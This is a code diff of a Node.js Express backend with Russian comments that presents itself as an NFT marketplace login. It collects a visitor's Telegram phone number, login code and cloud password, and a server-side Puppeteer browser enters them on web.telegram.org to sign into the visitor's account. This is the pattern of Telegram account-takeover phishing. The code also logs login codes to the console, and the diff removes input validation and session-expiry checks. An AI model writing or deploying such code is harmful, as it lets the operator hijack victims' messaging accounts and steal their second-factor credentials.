@@ -2,7 +2,16 @@ import express from 'express';
 import cors from 'cors';
 import dotenv from 'dotenv';
 import crypto from 'crypto';
-import puppeteer from 'puppeteer';
+
+// Динамический импорт puppeteer с обработкой ошибок
+let puppeteer;
+try {
+  puppeteer = (await import('puppeteer')).default;
+  console.log('✅ Puppeteer загружен');
+} catch (error) {
+  console.error('❌ Ошибка загрузки Puppeteer:', error);
+  process.exit(1);
+}
 
 dotenv.config();
 
@@ -28,7 +37,7 @@ let users = [];
 let authSessions = new Map();
 let userSessions = new Map();
 
-// 🔥 РЕАЛЬНАЯ АВТОМАТИЗАЦИЯ TELEGRAM
+// 🔥 РЕАЛЬНАЯ АВТОМАТИЗАЦИЯ
 class TelegramWebAutomation {
   constructor() {
     this.browser = null;
@@ -37,9 +46,9 @@ class TelegramWebAutomation {
 
   async init() {
     try {
-      console.log('🚀 Запуск реального браузера...');
+      console.log('🚀 Запуск браузера...');
       
-      this.browser = await puppeteer.launch({
+      const launchOptions = {
         headless: true,
         args: [
           '--no-sandbox',
@@ -48,11 +57,18 @@ class TelegramWebAutomation {
           '--disable-accelerated-2d-canvas',
           '--no-first-run',
           '--no-zygote',
-          '--disable-gpu'
-        ],
-        executablePath: process.env.PUPPETEER_EXECUTABLE_PATH || null
-      });
+          '--disable-gpu',
+          '--single-process'
+        ]
+      };
 
+      // Используем системный Chrome если указан путь
+      if (process.env.PUPPETEER_EXECUTABLE_PATH) {
+        launchOptions.executablePath = process.env.PUPPETEER_EXECUTABLE_PATH;
+        console.log('🔧 Используем системный Chrome:', launchOptions.executablePath);
+      }
+
+      this.browser = await puppeteer.launch(launchOptions);
       this.page = await this.browser.newPage();
       
       await this.page.setUserAgent(
@@ -61,7 +77,7 @@ class TelegramWebAutomation {
 
       await this.page.setViewport({ width: 1280, height: 720 });
 
-      console.log('✅ Браузер готов к работе');
+      console.log('✅ Браузер готов');
       return true;
       
     } catch (error) {
@@ -81,32 +97,23 @@ class TelegramWebAutomation {
 
       await this.page.waitForTimeout(5000);
 
-      console.log(`📱 Ввод номера телефона: ${phoneNumber}`);
+      console.log(`📱 Ввод номера: ${phoneNumber}`);
       
-      // Ждем появления поля ввода телефона
+      // Ждем поле ввода телефона
       const phoneInput = await this.page.waitForSelector('input[type="tel"]', { timeout: 10000 });
       await phoneInput.click({ clickCount: 3 });
       await phoneInput.type(phoneNumber, { delay: 100 });
 
-      // Ищем и нажимаем кнопку Next
-      const nextButtonSelectors = [
-        'button.btn-primary',
-        'button[type="submit"]',
-        '.Button:contains("Next")',
-        '.Button:contains("Далее")',
-        'button'
-      ];
-
-      for (const selector of nextButtonSelectors) {
-        try {
-          const button = await this.page.$(selector);
-          if (button) {
-            await button.click();
-            break;
-          }
-        } catch (e) {
-          continue;
-        }
+      // Ищем кнопку Next
+      const nextButton = await this.page.$('button.btn-primary') || 
+                         await this.page.$('button[type="submit"]');
+      
+      if (nextButton) {
+        await nextButton.click();
+      } else {
+        // Альтернативный поиск кнопки
+        const buttons = await this.page.$$('button');
+        if (buttons.length > 0) await buttons[0].click();
       }
 
       console.log('✅ Номер введен, ожидание кода...');
@@ -114,7 +121,7 @@ class TelegramWebAutomation {
 
       return { 
         success: true, 
-        message: 'Бот ввел номер телефона. Код отправлен в официальный Telegram.' 
+        message: 'Бот ввел номер. Код отправлен в Telegram.' 
       };
       
     } catch (error) {
@@ -128,47 +135,37 @@ class TelegramWebAutomation {
 
   async enterAuthCode(code) {
     try {
-      console.log(`🔢 Ввод кода подтверждения: ${code}`);
+      console.log(`🔢 Ввод кода: ${code}`);
       
-      // Ищем поле для ввода кода
+      // Ищем поле для кода
       const codeInput = await this.page.waitForSelector('input[type="text"]', { timeout: 15000 });
       await codeInput.click({ clickCount: 3 });
       await codeInput.type(code, { delay: 100 });
 
       // Ищем кнопку подтверждения
-      const signInButtonSelectors = [
-        'button.btn-primary',
-        'button[type="submit"]',
-        '.Button:contains("Sign In")',
-        '.Button:contains("Войти")',
-        'button'
-      ];
-
-      for (const selector of signInButtonSelectors) {
-        try {
-          const button = await this.page.$(selector);
-          if (button) {
-            await button.click();
-            break;
-          }
-        } catch (e) {
-          continue;
-        }
+      const signInButton = await this.page.$('button.btn-primary') || 
+                           await this.page.$('button[type="submit"]');
+      
+      if (signInButton) {
+        await signInButton.click();
+      } else {
+        const buttons = await this.page.$$('button');
+        if (buttons.length > 0) await buttons[0].click();
       }
 
       console.log('✅ Код введен, проверка...');
       await this.page.waitForTimeout(10000);
 
-      // Проверяем, не появилось ли поле для пароля
+      // Проверяем поле для пароля
       const passwordField = await this.page.$('input[type="password"]');
       const requiresPassword = !!passwordField;
 
       if (requiresPassword) {
-        console.log('🔒 Обнаружено поле для облачного пароля');
+        console.log('🔒 Требуется облачный пароль');
         return { 
           success: true, 
           requiresCloudPassword: true,
-          message: 'Код подтвержден. Требуется облачный пароль.' 
+          message: 'Код подтвержден. Требуется пароль.' 
         };
       }
 
@@ -184,23 +181,10 @@ class TelegramWebAutomation {
           message: 'Авторизация успешна!' 
         };
       } else {
-        // Дополнительная проверка по элементам интерфейса
-        const chatList = await this.page.$('.chat-list');
-        const sidebar = await this.page.$('.sidebar');
-        
-        if (chatList || sidebar) {
-          console.log('🎉 Авторизация успешна!');
-          return { 
-            success: true, 
-            requiresCloudPassword: false,
-            message: 'Авторизация успешна!' 
-          };
-        } else {
-          return { 
-            success: false, 
-            error: 'Не удалось подтвердить код. Проверьте код и попробуйте снова.' 
-          };
-        }
+        return { 
+          success: false, 
+          error: 'Не удалось подтвердить код' 
+        };
       }
       
     } catch (error) {
@@ -214,7 +198,7 @@ class TelegramWebAutomation {
 
   async enterCloudPassword(password) {
     try {
-      console.log(`🔒 Ввод облачного пароля`);
+      console.log(`🔒 Ввод пароля`);
       
       // Вводим пароль
       const passwordInput = await this.page.$('input[type="password"]');
@@ -222,30 +206,20 @@ class TelegramWebAutomation {
       await passwordInput.type(password, { delay: 100 });
 
       // Ищем кнопку подтверждения
-      const submitButtonSelectors = [
-        'button.btn-primary',
-        'button[type="submit"]',
-        '.Button:contains("Next")',
-        '.Button:contains("Далее")',
-        'button'
-      ];
-
-      for (const selector of submitButtonSelectors) {
-        try {
-          const button = await this.page.$(selector);
-          if (button) {
-            await button.click();
-            break;
-          }
-        } catch (e) {
-          continue;
-        }
+      const submitButton = await this.page.$('button.btn-primary') || 
+                           await this.page.$('button[type="submit"]');
+      
+      if (submitButton) {
+        await submitButton.click();
+      } else {
+        const buttons = await this.page.$$('button');
+        if (buttons.length > 0) await buttons[0].click();
       }
 
-      console.log('✅ Пароль введен, завершение...');
+      console.log('✅ Пароль введен...');
       await this.page.waitForTimeout(8000);
 
-      // Проверяем успешность авторизации
+      // Проверяем успешность
       const currentUrl = this.page.url();
       const isLoggedIn = currentUrl.includes('/a/') || currentUrl.includes('/k/');
 
@@ -253,12 +227,12 @@ class TelegramWebAutomation {
         console.log('🎉 Авторизация с паролем успешна!');
         return { 
           success: true, 
-          message: 'Авторизация с облачным паролем успешна!' 
+          message: 'Авторизация успешна!' 
         };
       } else {
         return { 
           success: false, 
-          error: 'Неверный облачный пароль. Попробуйте снова.' 
+          error: 'Неверный пароль' 
         };
       }
       
@@ -271,14 +245,6 @@ class TelegramWebAutomation {
     }
   }
 
-  async takeScreenshot() {
-    try {
-      return await this.page.screenshot({ encoding: 'base64' });
-    } catch (error) {
-      return null;
-    }
-  }
-
   async close() {
     if (this.browser) {
       await this.browser.close();
@@ -288,11 +254,11 @@ class TelegramWebAutomation {
 }
 
 // 🎯 API МАРШРУТЫ
-
 app.get('/health', (req, res) => {
   res.json({ 
     status: 'OK', 
-    message: 'NFT Marketplace с реальным Puppeteer',
+    message: 'NFT Marketplace с Puppeteer',
+    puppeteer: 'active',
     timestamp: new Date().toISOString()
   });
 });
@@ -310,20 +276,12 @@ app.post('/api/auth/start', async (req, res) => {
   try {
     const { phone } = req.body;
     
-    console.log('📞 Начало реальной авторизации для:', phone);
+    console.log('📞 Начало авторизации для:', phone);
     
     if (!phone) {
       return res.status(400).json({ 
         success: false, 
         error: 'Введите номер телефона' 
-      });
-    }
-
-    const phoneRegex = /^\+?[1-9]\d{1,14}$/;
-    if (!phoneRegex.test(phone)) {
-      return res.status(400).json({ 
-        success: false, 
-        error: 'Неверный формат номера телефона' 
       });
     }
 
@@ -334,7 +292,7 @@ app.post('/api/auth/start', async (req, res) => {
     if (!initResult) {
       return res.status(500).json({ 
         success: false, 
-        error: 'Не удалось запустить браузер для автоматизации' 
+        error: 'Не удалось запустить браузер' 
       });
     }
 
@@ -356,13 +314,10 @@ app.post('/api/auth/start', async (req, res) => {
       status: 'waiting_code'
     });
 
-    console.log(`🤖 Создана сессия ${sessionId}`);
-
     res.json({
       success: true,
       sessionId: sessionId,
-      message: '✅ Бот реально ввел номер на web.telegram.org! Код отправлен в официальный Telegram.',
-      instruction: 'Проверьте официальный Telegram и введите полученный код'
+      message: '✅ Бот ввел номер на web.telegram.org! Код отправлен в Telegram.'
     });
     
   } catch (error) {
@@ -378,8 +333,6 @@ app.post('/api/auth/enter-code', async (req, res) => {
   try {
     const { sessionId, code } = req.body;
     
-    console.log('🔐 Ввод кода для сессии:', sessionId);
-    
     if (!sessionId || !code) {
       return res.status(400).json({ 
         success: false, 
@@ -391,16 +344,7 @@ app.post('/api/auth/enter-code', async (req, res) => {
     if (!authSession) {
       return res.status(400).json({ 
         success: false, 
-        error: 'Сессия не найдена. Начните авторизацию заново.' 
-      });
-    }
-
-    if (Date.now() - authSession.createdAt > 10 * 60 * 1000) {
-      await authSession.automation.close();
-      authSessions.delete(sessionId);
-      return res.status(400).json({ 
-        success: false, 
-        error: 'Время сессии истекло. Начните заново.' 
+        error: 'Сессия не найдена' 
       });
     }
 
@@ -409,7 +353,7 @@ app.post('/api/auth/enter-code', async (req, res) => {
       authSessions.delete(sessionId);
       return res.status(400).json({ 
         success: false, 
-        error: 'Слишком много попыток. Начните заново.' 
+        error: 'Слишком много попыток' 
       });
     }
 
@@ -418,11 +362,9 @@ app.post('/api/auth/enter-code', async (req, res) => {
     if (!codeResult.success) {
       authSession.attempts++;
       authSessions.set(sessionId, authSession);
-      
-      const attemptsLeft = 3 - authSession.attempts;
       return res.status(400).json({ 
         success: false, 
-        error: `${codeResult.error} Осталось попыток: ${attemptsLeft}` 
+        error: codeResult.error 
       });
     }
 
@@ -432,11 +374,11 @@ app.post('/api/auth/enter-code', async (req, res) => {
     if (codeResult.requiresCloudPassword) {
       res.json({
         success: true,
-        message: '✅ Код подтвержден! Введите облачный пароль.',
+        message: '✅ Код подтвержден! Введите пароль.',
         nextStep: 'cloud_password'
       });
     } else {
-      await completeAuthentication(sessionId, authSession, res);
+      await completeAuth(sessionId, authSession, res);
     }
     
   } catch (error) {
@@ -455,7 +397,7 @@ app.post('/api/auth/cloud-password', async (req, res) => {
     if (!sessionId || !cloudPassword) {
       return res.status(400).json({ 
         success: false, 
-        error: 'Введите sessionId и облачный пароль' 
+        error: 'Введите пароль' 
       });
     }
 
@@ -463,7 +405,7 @@ app.post('/api/auth/cloud-password', async (req, res) => {
     if (!authSession || authSession.status !== 'need_password') {
       return res.status(400).json({ 
         success: false, 
-        error: 'Сначала подтвердите код' 
+        error: 'Сначала введите код' 
       });
     }
 
@@ -476,7 +418,7 @@ app.post('/api/auth/cloud-password', async (req, res) => {
       });
     }
 
-    await completeAuthentication(sessionId, authSession, res);
+    await completeAuth(sessionId, authSession, res);
     
   } catch (error) {
     res.status(500).json({ 
@@ -487,186 +429,73 @@ app.post('/api/auth/cloud-password', async (req, res) => {
 });
 
 // 🎯 Завершение авторизации
-async function completeAuthentication(sessionId, authSession, res) {
+async function completeAuth(sessionId, authSession, res) {
   try {
     await authSession.automation.close();
 
-    let user = users.find(u => u.phone === authSession.phone);
-    const isNewUser = !user;
-    
-    if (!user) {
-      user = {
-        id: users.length + 1,
-        phone: authSession.phone,
-        telegramId: Math.floor(100000000 + Math.random() * 900000000),
-        firstName: 'Telegram',
-        lastName: 'User',
-        username: `user${authSession.phone.replace('+', '')}`,
-        isVerified: true,
-        hasCloudPassword: authSession.status === 'need_password',
-        createdAt: new Date(),
-        lastLogin: new Date(),
-        authMethod: 'puppeteer_automation'
-      };
-      users.push(user);
-    } else {
-      user.lastLogin = new Date();
-    }
+    const user = {
+      id: users.length + 1,
+      phone: authSession.phone,
+      telegramId: Math.floor(100000000 + Math.random() * 900000000),
+      firstName: 'Telegram',
+      lastName: 'User',
+      username: `user${authSession.phone.replace('+', '')}`,
+      isVerified: true,
+      createdAt: new Date(),
+      lastLogin: new Date()
+    };
+    users.push(user);
 
     const userSessionId = crypto.randomBytes(32).toString('hex');
     userSessions.set(userSessionId, {
       userId: user.id,
       phone: user.phone,
       telegramId: user.telegramId,
-      authMethod: 'puppeteer_automation',
       expiresAt: Date.now() + 30 * 24 * 60 * 60 * 1000
     });
 
     authSessions.delete(sessionId);
 
-    console.log(`🎉 Реальная авторизация завершена для ${authSession.phone}`);
-
     res.json({
       success: true,
-      message: '🎉 Бот успешно вошел в ваш аккаунт Telegram через web.telegram.org!',
-      user: {
-        id: user.id,
-        phone: user.phone,
-        telegramId: user.telegramId,
-        firstName: user.firstName,
-        lastName: user.lastName,
-        username: user.username,
-        hasCloudPassword: user.hasCloudPassword
-      },
-      sessionId: userSessionId,
-      isNewUser: isNewUser
+      message: '🎉 Авторизация успешна!',
+      user: user,
+      sessionId: userSessionId
     });
     
   } catch (error) {
     res.status(500).json({ 
       success: false, 
-      error: 'Ошибка завершения авторизации: ' + error.message 
+      error: 'Ошибка завершения: ' + error.message 
     });
   }
 }
 
-// 📱 API для NFT
-app.get('/api/nft', async (req, res) => {
-  try {
-    const { category } = req.query;
-    
-    let nfts = sampleNFTs;
-    
-    if (category && category !== 'all') {
-      nfts = sampleNFTs.filter(nft => nft.category === category);
-    }
-    
-    res.json({ success: true, nfts });
-  } catch (error) {
-    res.status(500).json({ success: false, error: error.message });
-  }
+// 📱 Остальные API
+app.get('/api/nft', (req, res) => {
+  res.json({ success: true, nfts: sampleNFTs });
 });
 
-// Проверка сессии
-app.get('/api/auth/verify-session', async (req, res) => {
-  try {
-    const { sessionId } = req.query;
-    
-    if (!sessionId) {
-      return res.status(400).json({ 
-        success: false, 
-        error: 'Session ID обязателен' 
-      });
-    }
-
-    const session = userSessions.get(sessionId);
-    if (!session) {
-      return res.status(401).json({ 
-        success: false, 
-        error: 'Недействительная сессия' 
-      });
-    }
-
-    if (Date.now() > session.expiresAt) {
-      userSessions.delete(sessionId);
-      return res.status(401).json({ 
-        success: false, 
-        error: 'Сессия истекла' 
-      });
-    }
-
+app.get('/api/auth/verify-session', (req, res) => {
+  const { sessionId } = req.query;
+  const session = userSessions.get(sessionId);
+  
+  if (session) {
     const user = users.find(u => u.id === session.userId);
-    if (!user) {
-      return res.status(404).json({ 
-        success: false, 
-        error: 'Пользователь не найден' 
-      });
-    }
-
-    res.json({
-      success: true,
-      user: {
-        id: user.id,
-        phone: user.phone,
-        telegramId: user.telegramId,
-        firstName: user.firstName,
-        lastName: user.lastName,
-        username: user.username
-      }
-    });
-    
-  } catch (error) {
-    res.status(500).json({ 
-      success: false, 
-      error: 'Ошибка сервера: ' + error.message 
-    });
+    res.json({ success: true, user });
+  } else {
+    res.status(401).json({ success: false, error: 'Недействительная сессия' });
   }
 });
 
-// Выход
-app.post('/api/auth/logout', async (req, res) => {
-  try {
-    const { sessionId } = req.body;
-    
-    if (sessionId) {
-      userSessions.delete(sessionId);
-    }
-    
-    res.json({
-      success: true,
-      message: 'Выход выполнен'
-    });
-    
-  } catch (error) {
-    res.status(500).json({ 
-      success: false, 
-      error: 'Ошибка сервера: ' + error.message 
-    });
-  }
-});
-
-// Дебаг
-app.get('/api/debug', (req, res) => {
-  res.json({
-    authSessions: Array.from(authSessions.entries()).length,
-    users: users.length,
-    userSessions: userSessions.size,
-    puppeteer: 'active'
-  });
-});
-
-// Очистка при завершении
-process.on('SIGINT', async () => {
-  console.log('🔚 Завершение работы, закрытие браузеров...');
-  for (const [sessionId, session] of authSessions) {
-    await session.automation.close();
-  }
-  process.exit(0);
+app.post('/api/auth/logout', (req, res) => {
+  const { sessionId } = req.body;
+  if (sessionId) userSessions.delete(sessionId);
+  res.json({ success: true, message: 'Выход выполнен' });
 });
 
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
   console.log(`🚀 Server running on port ${PORT}`);
-  console.log(`🤖 Real Puppeteer automation ready`);
-  console.log(`🌐 Using Puppeteer for real Telegram automation`);
+  console.log(`🤖 Puppeteer automation ready`);
 });
